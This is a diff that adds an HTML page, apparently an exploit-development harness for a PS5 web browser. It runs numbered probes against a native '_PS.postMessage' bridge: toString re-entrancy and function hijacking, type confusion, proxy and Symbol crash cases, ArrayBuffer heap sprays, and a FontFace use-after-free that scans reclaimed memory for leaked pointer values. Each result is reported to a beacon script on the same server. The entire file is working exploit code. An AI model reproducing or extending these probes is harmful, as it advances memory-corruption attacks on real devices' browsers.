@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v5</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v5_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v5 BOOT test='+testNum);
+bn('P844v5-BOOT','test='+testNum);
+
+var TESTS=[
+  // === SAFE FIRST: v4 remaining tests that didn't run ===
+  // T0: toString throws (error propagation)
+  function T0(){
+    var r=[];
+    try{_PS.postMessage({toString:function(){throw new Error('boom');}});r.push('noThrow');}catch(e){r.push('threw='+e.message);}
+    try{_PS.postMessage({toString:function(){throw 42;}});r.push('noThrow2');}catch(e){r.push('threw2='+e);}
+    try{_PS.postMessage({toString:function(){throw null;}});r.push('noThrow3');}catch(e){r.push('threw3='+e);}
+    return r.join('|');
+  },
+  // T1: String sizes
+  function T1(){
+    var r=[];
+    try{r.push('10K='+_PS.postMessage('A'.repeat(10240)));}catch(e){r.push('10KErr:'+e.message);}
+    try{r.push('100K='+_PS.postMessage('A'.repeat(102400)));}catch(e){r.push('100KErr:'+e.message);}
+    try{r.push('1M='+_PS.postMessage('A'.repeat(1048576)));}catch(e){r.push('1MErr:'+e.message);}
+    return r.join('|');
+  },
+  // T2: GC spray during toString (no FontFace, just AB)
+  function T2(){
+    var bufs=[];
+    var leaked='none';
+    var obj={toString:function(){
+      for(var i=0;i<200;i++)bufs.push(new ArrayBuffer(192));
+      for(var i=0;i<100;i++){var a=new Array(10000);a=null;}
+      for(var i=0;i<bufs.length;i++){
+        var bv=new BigUint64Array(bufs[i]);
+        for(var j=0;j<24;j++){
+          if(bv[j]!==0n){leaked='idx='+i+'/'+j+'=0x'+bv[j].toString(16);break;}
+        }
+        if(leaked!=='none')break;
+      }
+      return 'spray-done';
+    }};
+    var r=_PS.postMessage(obj);
+    return 'leaked='+leaked+'|bufs='+bufs.length+'|ret='+r;
+  },
+  // T3: Replace postMessage mid-toString
+  function T3(){
+    var origPM=_PS.postMessage;
+    var replaced=false;
+    var obj={toString:function(){
+      try{Object.defineProperty(_PS,'postMessage',{value:function(){replaced=true;return 'hijacked';},writable:true,configurable:true});}catch(e){}
+      try{_PS.postMessage=function(){replaced=true;return 'hijacked2';};}catch(e){}
+      return 'replace-attempted';
+    }};
+    var r;
+    try{r=origPM.call(_PS,obj);}catch(e){r='err:'+e.message;}
+    try{Object.defineProperty(_PS,'postMessage',{value:origPM});}catch(e){}
+    return 'replaced='+replaced+'|ret='+r;
+  },
+  // T4: Re-entrancy depth
+  function T4(){
+    var depths=[];
+    var depth=0;
+    var obj={toString:function(){
+      depth++;
+      depths.push(depth);
+      if(depth<=8){try{_PS.postMessage({toString:function(){depth++;depths.push(depth);return 'd'+depth;}});}catch(e){depths.push('err');}}
+      return 'depth-'+depth;
+    }};
+    _PS.postMessage(obj);
+    return 'depths='+depths.join(',');
+  },
+  // T5: Internal slots of postMessage
+  function T5(){
+    var r=[];
+    try{r.push('name='+_PS.postMessage.name);}catch(e){r.push('nameErr');}
+    try{r.push('length='+_PS.postMessage.length);}catch(e){r.push('lenErr');}
+    try{r.push('proto='+String(Object.getPrototypeOf(_PS.postMessage)));}catch(e){r.push('protoErr:'+e.message);}
+    try{r.push('ctor='+_PS.postMessage.constructor.name);}catch(e){r.push('ctorErr');}
+    try{r.push('toStr='+_PS.postMessage.toString().substring(0,80));}catch(e){r.push('toStrErr:'+e.message);}
+    try{r.push('isNative='+(_PS.postMessage.toString().indexOf('[native code]')>=0));}catch(e){}
+    return r.join('|');
+  },
+  // T6: structuredClone of _PS
+  function T6(){
+    var r=[];
+    try{var c=structuredClone(_PS);r.push('clone='+typeof c+'|keys='+Object.keys(c).join(','));}catch(e){r.push('cloneErr:'+e.message);}
+    try{r.push('json='+JSON.stringify(_PS));}catch(e){r.push('jsonErr:'+e.message);}
+    return r.join('|');
+  },
+  // T7: FontFace UAF in toString — RETRY with more aggressive timing
+  function T7(){
+    var H='none';
+    var fabs=[];
+    var nonzero=0;
+    var allvals=[];
+    var obj={toString:function(){
+      try{
+        // Create 3 font faces to increase chance of reclaim
+        for(var f=0;f<3;f++){
+          var st=document.createElement('style');
+          st.textContent="@font-face{font-family:uu5_"+f+";src:local(Arial);unicode-range:U+004"+(2+f)+";}";
+          document.head.appendChild(st);
+          var face=new FontFace('uf5_'+f,"local('Helvetica')",{unicodeRange:'U+0041'});
+          document.fonts.add(face);
+          void face.loaded;
+          var ffired=false;
+          (function(s,fc){
+            Object.defineProperty(FontFace.prototype,'then',{
+              configurable:true,
+              get:function(){
+                if(ffired)return undefined;
+                ffired=true;
+                s.remove();s.textContent='';
+                try{document.fonts.delete(this);}catch(e){}
+                return undefined;
+              },set:function(){}
+            });
+          })(st,face);
+          document.fonts.load('1em uf5_'+f+', uu5_'+f,'AB');
+        }
+        // Force layout
+        document.body.offsetHeight;
+        // Spray 128 ABs
+        fabs=[];
+        for(var i=0;i<128;i++)fabs.push(new ArrayBuffer(192));
+        // Force more layout + GC
+        document.body.offsetHeight;
+        for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+        document.body.offsetHeight;
+        // Scan ALL buffers for ANY non-zero data
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){
+            if(bv[j]!==0n){
+              nonzero++;
+              var hi=Number(bv[j]>>32n);
+              allvals.push(i+':'+j+'=0x'+bv[j].toString(16));
+              if(hi>0x100&&hi<0x7FFF&&H==='none')H='0x'+bv[j].toString(16);
+              if(allvals.length>=8)break;
+            }
+          }
+          if(allvals.length>=8)break;
+        }
+      }catch(e){H='err:'+e.message;}
+      return 'UAF-H='+H;
+    }};
+    var r=_PS.postMessage(obj);
+    return 'H='+H+'|nz='+nonzero+'|vals='+allvals.join(';')+'|bufs='+fabs.length;
+  },
+  // T8: FontFace UAF OUTSIDE toString (baseline: does reclaim work at all?)
+  function T8(){
+    var H='none';
+    var fabs=[];
+    var nonzero=0;
+    var allvals=[];
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:bb8;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('f8',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);
+      void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{
+        configurable:true,
+        get:function(){
+          if(ffired)return undefined;
+          ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];
+          for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em bb8');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}
+      });
+      document.fonts.load('1em f8, bb8','AB');
+      // Give it a moment
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      // Scan
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        for(var j=0;j<24;j++){
+          if(bv[j]!==0n){
+            nonzero++;
+            allvals.push(i+':'+j+'=0x'+bv[j].toString(16));
+            var hi=Number(bv[j]>>32n);
+            if(hi>0x100&&hi<0x7FFF&&H==='none')H='0x'+bv[j].toString(16);
+            if(allvals.length>=8)break;
+          }
+        }
+        if(allvals.length>=8)break;
+      }
+    }catch(e){H='err:'+e.message;}
+    return 'H='+H+'|nz='+nonzero+'|vals='+allvals.join(';')+'|bufs='+fabs.length;
+  },
+
+  // === TYPE CONFUSION ISOLATION (T9-T14) — each may crash ===
+  // T9: toString returns number
+  function T9(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return 42;}});}catch(e){r='err:'+e.message;}
+    return 'num_ret='+r;
+  },
+  // T10: toString returns boolean
+  function T10(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return true;}});}catch(e){r='err:'+e.message;}
+    return 'bool_ret='+r;
+  },
+  // T11: toString returns null
+  function T11(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return null;}});}catch(e){r='err:'+e.message;}
+    return 'null_ret='+r;
+  },
+  // T12: toString returns undefined
+  function T12(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return undefined;}});}catch(e){r='err:'+e.message;}
+    return 'undef_ret='+r;
+  },
+  // T13: toString returns object
+  function T13(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return {x:1};}});}catch(e){r='err:'+e.message;}
+    return 'obj_ret='+r;
+  },
+  // T14: toString returns array
+  function T14(){
+    var r;
+    try{r=_PS.postMessage({toString:function(){return [1,2,3];}});}catch(e){r='err:'+e.message;}
+    return 'arr_ret='+r;
+  },
+
+  // === PROXY SUB-STEPS (T15-T17) ===
+  // T15: Just create proxy, no access
+  function T15(){
+    var p=new Proxy(_PS,{});
+    return 'created='+typeof p;
+  },
+  // T16: Read property through proxy
+  function T16(){
+    var trapped=[];
+    var p=new Proxy(_PS,{get:function(t,prop){trapped.push(String(prop));return Reflect.get(t,prop);}});
+    var pm=p.postMessage;
+    return 'trapped='+trapped.join(',')+'|pm='+typeof pm;
+  },
+  // T17: Call postMessage through proxy
+  function T17(){
+    var trapped=[];
+    var p=new Proxy(_PS,{get:function(t,prop){trapped.push('get:'+String(prop));return Reflect.get(t,prop);}});
+    try{p.postMessage('proxy-call');trapped.push('ok');}catch(e){trapped.push('err:'+e.message);}
+    return trapped.join('|');
+  },
+
+  // === SYMBOL (T18-T19) ===
+  // T18: Symbol.toString override
+  function T18(){
+    var orig=Symbol.prototype.toString;
+    var called=false;
+    Symbol.prototype.toString=function(){called=true;return 'safe';};
+    var r;
+    try{r=_PS.postMessage(Symbol('test'));}catch(e){r='err:'+e.message;}
+    Symbol.prototype.toString=orig;
+    return 'called='+called+'|ret='+r;
+  },
+  // T19: Raw Symbol (known crash)
+  function T19(){
+    var r;
+    try{r=_PS.postMessage(Symbol('crash'));}catch(e){r='err:'+e.message;}
+    return 'ret='+r;
+  }
+];
+
+var NAMES=[
+  'T0-throwTypes','T1-strSizes','T2-gcSpray','T3-replacePm',
+  'T4-reentrant','T5-internalSlots','T6-structClone','T7-uafRetry','T8-uafBaseline',
+  'T9-retNum','T10-retBool','T11-retNull','T12-retUndef','T13-retObj','T14-retArr',
+  'T15-proxyCreate','T16-proxyGet','T17-proxyCall',
+  'T18-symOverride','T19-symRaw'
+];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v5-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v5-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v5-'+name+'-OK',String(result).substring(0,800));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v5-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,150);
+</script>
+</body>
+</html>
